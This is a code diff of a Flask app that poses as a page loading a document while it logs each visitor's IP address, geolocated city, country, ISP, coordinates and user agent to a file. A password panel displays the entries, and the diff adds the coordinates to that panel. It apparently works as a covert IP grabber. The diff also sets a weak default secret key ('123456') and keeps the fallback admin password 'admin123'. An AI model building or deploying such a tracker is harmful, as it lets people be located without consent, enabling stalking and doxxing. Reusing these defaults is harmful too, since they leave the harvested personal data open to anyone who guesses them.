@@ -5,11 +5,9 @@ import json
 import os
 
 app = Flask(__name__)
+app.secret_key = os.environ.get("SECRET_KEY", "123456")
 
-# 🔐 chave segura via variável de ambiente
-app.secret_key = os.environ.get("SECRET_KEY", "trocar_essa_chave")
-
-# 📂 arquivo temporário no Railway
+# 🔥 usar /tmp no Railway
 LOG_FILE = "/tmp/logs.json"
 
 # ================= IP =================
@@ -27,11 +25,13 @@ def get_ip_info(ip):
             return data
     except Exception as e:
         print("Erro GEO:", e)
+
     return {}
 
 # ================= LOAD =================
 def load_logs():
     try:
+        # cria arquivo se não existir
         if not os.path.exists(LOG_FILE):
             with open(LOG_FILE, "w", encoding="utf-8") as f:
                 json.dump([], f)
@@ -48,6 +48,7 @@ def load_logs():
 def save_log(entry):
     logs = load_logs()
     logs.append(entry)
+
     with open(LOG_FILE, "w", encoding="utf-8") as f:
         json.dump(logs, f, indent=2, ensure_ascii=False)
 
@@ -68,8 +69,8 @@ def home():
         "cidade": info.get("city", "N/A"),
         "pais": info.get("country", "N/A"),
         "isp": info.get("isp", "N/A"),
-        "lat": info.get("lat"),
-        "lon": info.get("lon"),
+        "lat": info.get("lat", "N/A"),
+        "lon": info.get("lon", "N/A"),
         "hora": now,
         "ua": ua,
         "repetido": repetido
@@ -80,12 +81,12 @@ def home():
     return "<h3>Carregando documento...</h3>"
 
 # ================= LOGIN =================
-@app.route('/login', methods=['GET', 'POST'])
+@app.route('/login', methods=['GET','POST'])
 def login():
-    senha_correta = os.environ.get("ADMIN_PASSWORD", "admin123")
+    senha = os.environ.get("ADMIN_PASSWORD", "admin123")
 
     if request.method == 'POST':
-        if request.form.get("senha") == senha_correta:
+        if request.form.get("senha") == senha:
             session['logado'] = True
             return redirect('/painel')
 
@@ -125,6 +126,7 @@ def painel():
             <b>IP:</b> {{l.ip}} {% if l.repetido %}<span class="red">(Repetido)</span>{% endif %}<br>
             <b>Local:</b> {{l.cidade}} - {{l.pais}}<br>
             <b>ISP:</b> {{l.isp}}<br>
+            <b>Lat/Lon:</b> {{l.lat}}, {{l.lon}}<br>
             <b>Hora:</b> {{l.hora}}<br>
             <b>User-Agent:</b> {{l.ua}}<br>
         </div>
